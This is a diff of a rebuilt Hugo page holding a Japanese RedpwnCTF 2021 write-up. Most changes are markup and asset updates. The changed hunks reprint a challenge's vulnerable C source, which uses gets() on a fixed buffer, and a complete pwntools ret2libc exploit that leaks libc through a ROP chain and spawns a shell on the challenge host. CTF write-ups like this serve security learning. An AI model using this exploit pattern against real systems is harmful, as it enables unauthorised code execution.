@@ -23,7 +23,7 @@
 <meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
 
 
-<meta name="generator" content="Hugo 0.74.2 with theme even" />
+<meta name="generator" content="Hugo 0.119.0 with theme even" />
 
 
 <link rel="canonical" href="https://captureamerica.github.io/writeups/post/redpwnctf_2021/" />
@@ -35,24 +35,20 @@
 
 
 
-<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link href="https://captureamerica.github.io/writeups/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
 
 
 
 <meta property="og:title" content="RedpwnCTF 2021 Writeup" />
 <meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2021.redpwn.net/ 1146点を獲得し、最終順位は317位でした。 解いたチャレンジ 最近たまに見るこの rCTF という Platform は redpwn CTF team が作ったもの" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://captureamerica.github.io/writeups/post/redpwnctf_2021/" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/redpwnctf_2021/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2021-07-17T09:00:00+09:00" />
 <meta property="article:modified_time" content="2021-07-17T09:00:00+09:00" />
 <meta itemprop="name" content="RedpwnCTF 2021 Writeup">
-<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2021.redpwn.net/ 1146点を獲得し、最終順位は317位でした。 解いたチャレンジ 最近たまに見るこの rCTF という Platform は redpwn CTF team が作ったもの">
-<meta itemprop="datePublished" content="2021-07-17T09:00:00&#43;09:00" />
-<meta itemprop="dateModified" content="2021-07-17T09:00:00&#43;09:00" />
-<meta itemprop="wordCount" content="720">
-
-
-
+<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2021.redpwn.net/ 1146点を獲得し、最終順位は317位でした。 解いたチャレンジ 最近たまに見るこの rCTF という Platform は redpwn CTF team が作ったもの"><meta itemprop="datePublished" content="2021-07-17T09:00:00+09:00" />
+<meta itemprop="dateModified" content="2021-07-17T09:00:00+09:00" />
+<meta itemprop="wordCount" content="721">
 <meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="RedpwnCTF 2021 Writeup"/>
 <meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2021.redpwn.net/ 1146点を獲得し、最終順位は317位でした。 解いたチャレンジ 最近たまに見るこの rCTF という Platform は redpwn CTF team が作ったもの"/>
@@ -220,7 +216,7 @@ Admin bot  (admin botへのリンク)</p>
 <img src="https://captureamerica.github.io/writeups/img/redpwnctf_2021_pastebin3.png" alt="redpwnctf_2021_pastebin3.png"></p>
 </li>
 </ol>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{d1dn7_n33d_70_b3_1n_ru57}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -242,7 +238,7 @@ nc mc.ax 31568</p>
 <p>ret2the-unknown.c の中身：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -266,29 +262,29 @@ nc mc.ax 31568</p>
 </span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
-</span><span class="cp"></span>
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-<span class="p">{</span>
-  <span class="kt">char</span> <span class="n">your_reassuring_and_comforting_we_will_arrive_safely_in_libc</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
-
-  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
-  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
-  <span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
-
-  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;that board meeting was a *smashing* success! rob loved the challenge!&#34;</span><span class="p">);</span>
-  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;in fact, he loved it so much he sponsored me a business trip to this place called &#39;libc&#39;...&#34;</span><span class="p">);</span>
-  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;where is this place? can you help me get there safely?&#34;</span><span class="p">);</span>
-
-  <span class="c1">// please i cant afford the medical bills if we crash and segfault
-</span><span class="c1"></span>  <span class="n">gets</span><span class="p">(</span><span class="n">your_reassuring_and_comforting_we_will_arrive_safely_in_libc</span><span class="p">);</span>
-
-  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;phew, good to know. shoot! i forgot!&#34;</span><span class="p">);</span>
-  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;rob said i&#39;d need this to get there: %llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">printf</span><span class="p">);</span>
-  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;good luck!&#34;</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">your_reassuring_and_comforting_we_will_arrive_safely_in_libc</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;that board meeting was a *smashing* success! rob loved the challenge!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;in fact, he loved it so much he sponsored me a business trip to this place called &#39;libc&#39;...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;where is this place? can you help me get there safely?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">// please i cant afford the medical bills if we crash and segfault
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">gets</span><span class="p">(</span><span class="n">your_reassuring_and_comforting_we_will_arrive_safely_in_libc</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;phew, good to know. shoot! i forgot!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;rob said i&#39;d need this to get there: %llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">printf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;good luck!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><br>
 <h3 id="solution-1">Solution</h3>
@@ -305,7 +301,7 @@ $ checksec ret2the-unknown
 <p>以下、ほとんど今までのコードの使いまわしです。。。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -337,39 +333,39 @@ $ checksec ret2the-unknown
 </span><span class="lnt">30
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
-<span class="c1"># -*- coding:utf-8 -*-</span>
-
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;critical&#39;</span>
-
-<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./ret2the-unknown&#39;</span><span class="p">)</span>
-<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span>
-
-<span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;mc.ax&#39;</span><span class="p">,</span> <span class="mi">31568</span><span class="p">)</span>
-
-<span class="n">bufsize</span> <span class="o">=</span> <span class="mi">32</span> <span class="o">+</span> <span class="mi">8</span>
-<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
-<span class="n">rop</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">puts</span><span class="p">)</span>
-<span class="n">rop</span><span class="o">.</span><span class="n">main</span><span class="p">()</span>
-<span class="k">print</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;safely?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="n">bufsize</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;luck!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-<span class="n">puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
-<span class="k">print</span><span class="p">(</span><span class="s1">&#39;puts: </span><span class="si">%x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">puts</span><span class="p">)</span>
-<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.28.so&#39;</span><span class="p">)</span>
-<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">puts</span>
-
-<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
-<span class="n">rop</span><span class="o">.</span><span class="n">execv</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)),</span> <span class="mi">0</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;safely?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="n">bufsize</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;luck!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>	</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding:utf-8 -*-</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;critical&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./ret2the-unknown&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;mc.ax&#39;</span><span class="p">,</span> <span class="mi">31568</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">bufsize</span> <span class="o">=</span> <span class="mi">32</span> <span class="o">+</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">puts</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span><span class="o">.</span><span class="n">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;safely?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="n">bufsize</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;luck!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;puts: </span><span class="si">%x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">puts</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.28.so&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">puts</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span><span class="o">.</span><span class="n">execv</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)),</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;safely?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="n">bufsize</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;luck!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>	</span></span></code></pre></td></tr></table>
 </div>
 </div>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{rob-is-proud-of-me-for-exploring-the-unknown-but-i-still-cant-afford-housing}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -425,7 +421,7 @@ $ checksec ret2the-unknown
     <footer id="footer" class="footer">
       <div class="social-links">
       <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
-  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+  
 </div>
 
 <div class="copyright">
@@ -460,20 +456,21 @@ $ checksec ret2the-unknown
 
 
 
-<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>
 
 
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
 	ga('create', 'UA-104910699-2', 'auto');
 	ga('set', 'anonymizeIp', true);
 	ga('send', 'pageview');
 }
 </script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
 
 
 
